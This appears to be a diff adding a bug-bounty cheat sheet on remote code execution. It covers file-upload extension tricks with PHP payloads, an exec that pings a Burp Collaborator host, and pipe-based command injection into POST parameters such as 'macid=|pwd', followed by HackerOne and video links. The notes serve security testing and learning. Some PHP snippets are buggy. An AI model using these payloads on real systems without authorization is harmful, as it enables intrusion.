@@ -1,0 +1,67 @@
+	+-------------------------------------------------+
+	+-------------------------------------------------+
++------------------ Remote Code Execution -----------------+
+	+-------------------------------------------------+
+	+-------------------------------------------------+
+
+	
+1) RCE via file upload ---------------------------+
+
+i) upload a normal image (ensure the request is recorded in burp proxy)
+ii) send the request to burp repeater
+iii) change the filename from "payload.jpg" to "payload.pht" (try differnet php extensions)
+iv) remove the content of the file(unreadble) and add the payload, will show php version running
+
+<?php
+echo echo("testing rce"); 
+phpinfo();
+?>
+
+v) send the request from burp in repeater and see the response
+
+
+http://localhost/admin/delete?username=carlos
+
+
+2) RCE via file upload ---------------------------+
+
+i) upload a normal image (ensure the request is recorded in burp proxy)
+ii) send the request to burp repeater
+iii) upload the php file with the payload eg payload.jpg.php
+iv) access the file path eg https://example.com/images/payload.jpg.php through burp
+v) you can also ping the burp collaborator using the payload :
+
+<?php
+$str = exec("ping -c 1 burp_collaborator.net");
+if ($result == 0){
+  echo "ping succeeded";
+}else{
+  echo "ping failed";
+}
+?>
+
+
+3) RCE via POST parameters ---------------------------+
+
+i) enter some data in the post request
+ii) send that request to burp repeater
+iii) look any parameter that is being verified by the system eg postal codes, mac id etc ,etner a pipe character then an os command eg macid=|pwd, or macid=%7cpwd
+iv) send the request to see if the commands reponse is returned
+
+
+
+RCE
+
+https://hackerone.com/reports/783877
+
+https://hackerone.com/reports/403417
+
+https://hackerone.com/reports/135072
+
+https://hackerone.com/reports/1154542
+
+https://hackerone.com/reports/412021
+
+
+https://www.youtube.com/watch?v=f3x7scaGP74
+https://www.youtube.com/watch?v=rvPajdO0Pvw
